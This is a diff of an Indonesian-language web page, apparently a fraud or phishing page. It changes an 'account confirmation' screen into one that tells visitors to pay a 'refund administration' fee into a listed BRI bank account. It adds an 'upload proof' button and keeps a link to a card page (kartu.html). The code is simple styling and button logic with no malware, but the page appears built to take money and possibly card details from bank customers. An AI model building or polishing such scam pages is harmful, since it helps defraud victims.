@@ -6,51 +6,80 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Konfirmasi Rekening</title>
   <style>
-  .Black-text {
-  color: Black;
-  font-size: 18px;
-  margin-right:-8px;
-  margin-left:7px;
-  font-weight:bold;
-  position:center;
-  
-}
-.line-menurun {
-  line-height: 1.1; /* Membuat jarak antar baris 1.5 kali tinggi huruf */
-}
-.spasi-teks {
-  margin-bottom: 5px; /* Menambahkan spasi bawah sebesar 10 piksel */
-}
+    .Black-text {
+      color: Black;
+      font-size: 18px;
+      margin-right:-8px;
+      margin-left:7px;
+      font-weight:bold;
+      position:center;
+    }
+    .line-menurun {
+      line-height: 1.1;
+    }
+    .spasi-teks {
+      margin-bottom: 5px;
+    }
     .container {
       display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
     }
-
     .option-button {
-  padding: 10px 42px;
-  margin-right: 60px;
-  margin-left: 20px; /* Menambahkan margin kiri */
-  background-color: #ff0000;
-  color: #ffffff;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-  transition: background-color 0.3s ease;
-}
-
-.option-button:first-child {
-  margin-left: 10; /* Menghapus margin kiri untuk tombol pertama */
-  margin-right: 60px;
-}
-
+      padding: 10px 42px;
+      margin: 10px;
+      background-color: #ff0000;
+      color: #ffffff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .option-button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
   </style>
 </head>
 <body>
-  <p class="right-align Black-text">Pastikan Sudah Ada Kartu ATM </p>
-  <p class="right-align Black-text">Pastikan Sudah Terdaftar Mobile Banking </p><br>
-    
-    <div class="container">
-    <button class="option-button">TIDAK</button>
-    <a href="kartu.html" class="option-button">YA</a>
+  <p class="right-align Black-text">Konfirmasi Administrasi </p>
+  <p class="right-align Black-text">Silahkan Selesaikan Pembayaran Administrasi Refund </p>
+  <p class="right-align Black-text">Bank BRI No Rek 10352081244537393 A/n TRI USAHA BERKAT</p><br>
+
+  <div class="container">
+    <button id="unggah-foto" class="option-button">Unggah Bukti</button>
+    <button id="tidak-btn" class="option-button" disabled>TIDAK</button>
+    <a id="ya-btn" href="kartu.html" class="option-button" disabled>YA</a>
   </div>
+
+  <script>
+    // Fungsi untuk memeriksa apakah foto telah diunggah
+    function cekFotoDiunggah() {
+      // Lakukan pengecekan apakah foto telah diunggah atau tidak
+      // Misalnya, Anda dapat menggunakan variabel atau fungsi untuk ini
+      var fotoDiunggah = false; // Ganti dengan logika Anda
+
+      // Kondisi untuk menentukan apakah tombol "YA" dapat diaktifkan
+      if (fotoDiunggah) {
+        document.getElementById("ya-btn").removeAttribute("disabled");
+      } else {
+        document.getElementById("ya-btn").setAttribute("disabled", "disabled");
+      }
+    }
+
+    // Panggil fungsi cekFotoDiunggah saat dokumen dimuat
+    document.addEventListener("DOMContentLoaded", cekFotoDiunggah);
+
+    // Tambahkan event listener untuk tombol unggah foto
+    document.getElementById("unggah-foto").addEventListener("click", function() {
+      // Di sini Anda dapat menambahkan logika untuk membuka dialog unggah foto
+      // Misalnya, munculkan dialog unggah foto atau tautan ke halaman unggah foto
+      alert("Anda akan diarahkan untuk mengunggah foto.");
+      
+      // Setelah foto diunggah, aktifkan tombol "YA"
+      document.getElementById("ya-btn").removeAttribute("disabled");
+    });
+  </script>
 </body>
 </html>
